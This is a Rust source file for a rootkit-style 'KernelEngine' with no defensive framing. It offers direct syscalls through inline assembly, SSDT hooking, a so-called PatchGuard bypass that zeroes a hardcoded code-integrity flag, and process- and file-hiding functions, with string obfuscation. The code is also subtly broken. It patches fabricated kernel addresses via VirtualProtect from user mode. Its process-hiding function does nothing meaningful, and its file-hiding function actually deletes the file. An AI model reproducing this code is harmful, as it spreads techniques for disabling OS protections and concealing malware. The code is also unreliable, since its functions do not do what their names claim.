use winapi::um::winnt::HANDLE;
use std::arch::asm;

pub struct KernelEngine {
    syscall_map: std::collections::HashMap<u32, u64>,
}

impl KernelEngine {
    pub fn new() -> Self {
        let mut engine = KernelEngine {
            syscall_map: std::collections::HashMap::new(),
        };
        engine.init_syscall_map();
        engine
    }

    fn init_syscall_map(&mut self) {
        self.syscall_map.insert(0x0001, 0x26);
        self.syscall_map.insert(0x0026, 0x53);
        self.syscall_map.insert(0x0030, 0x55);
    }

    pub fn direct_syscall(&self, syscall_num: u32, args: &[u64]) -> u64 {
        unsafe {
            let mut result: u64 = 0;
            let syscall_id = *self.syscall_map.get(&syscall_num).unwrap_or(&syscall_num);
            
            asm!(
                "mov r10, rcx",
                "mov eax, {syscall}",
                "syscall",
                "mov {result}, rax",
                syscall = in(reg) syscall_id,
                result = out(reg) result,
                in("rcx") args.get(0).copied().unwrap_or(0),
                in("rdx") args.get(1).copied().unwrap_or(0),
                in("r8") args.get(2).copied().unwrap_or(0),
                in("r9") args.get(3).copied().unwrap_or(0),
                options(nostack, preserves_flags)
            );
            
            result
        }
    }

    pub fn hook_ssdt(&self, index: u32, hook_addr: u64) -> bool {
        unsafe {
            let ki_system_call = 0xFFFFF80000000000 + 0x1050;
            let ssdt_base = *(ki_system_call as *const u64);
            let ssdt_entry = ssdt_base + (index as u64 * 8);
            
            let mut old_protect: u32 = 0;
            if winapi::um::memoryapi::VirtualProtect(
                ssdt_entry as _,
                8,
                0x40,
                &mut old_protect,
            ) != 0 {
                *(ssdt_entry as *mut u64) = hook_addr;
                true
            } else {
                false
            }
        }
    }

    pub fn patch_guard_bypass(&self) -> bool {
        unsafe {
            let g_ci_enabled = 0xFFFFF80000000000 + 0x141578;
            let patch: u8 = 0;
            
            let mut old_protect: u32 = 0;
            if winapi::um::memoryapi::VirtualProtect(
                g_ci_enabled as _,
                1,
                0x40,
                &mut old_protect,
            ) != 0 {
                *(g_ci_enabled as *mut u8) = patch;
                true
            } else {
                false
            }
        }
    }

    pub fn hide_process_kernel(&self, pid: u32) -> bool {
        let ntdll = obfstr::obfstr!("ntdll.dll");
        let ntdll_handle = unsafe {
            winapi::um::libloaderapi::GetModuleHandleA(ntdll.as_ptr() as *const i8)
        };
        
        if ntdll_handle.is_null() {
            return false;
        }

        unsafe {
            let mut info: ntapi::ntpsapi::PROCESS_INFORMATION_CLASS = 0;
            let handle: HANDLE = std::ptr::null_mut();
            
            let status = ntapi::ntpsapi::NtQueryInformationProcess(
                handle,
                info,
                std::ptr::null_mut(),
                0,
                std::ptr::null_mut(),
            );
            
            status == 0
        }
    }

    pub fn hide_file_kernel(&self, path: &str) -> bool {
        unsafe {
            let ntdll = obfstr::obfstr!("ntdll.dll");
            let hmod = winapi::um::libloaderapi::GetModuleHandleA(ntdll.as_ptr() as *const i8);
            
            if hmod.is_null() {
                return false;
            }

            let mut file_handle: HANDLE = std::ptr::null_mut();
            let mut obj_attr: ntapi::ntobjectapi::OBJECT_ATTRIBUTES = std::mem::zeroed();
            
            let path_bytes = path.as_bytes();
            let mut unicode_path = ntapi::ntdef::UNICODE_STRING {
                Length: path_bytes.len() as u16,
                MaximumLength: path_bytes.len() as u16,
                Buffer: path_bytes.as_ptr() as _,
            };
            
            obj_attr.Length = std::mem::size_of::<ntapi::ntobjectapi::OBJECT_ATTRIBUTES>() as u32;
            obj_attr.ObjectName = &mut unicode_path;
            
            let io_status: ntapi::ntioapi::IO_STATUS_BLOCK = std::mem::zeroed();
            
            let status = ntapi::ntioapi::ZwDeleteFile(&mut obj_attr);
            status == 0
        }
    }
}
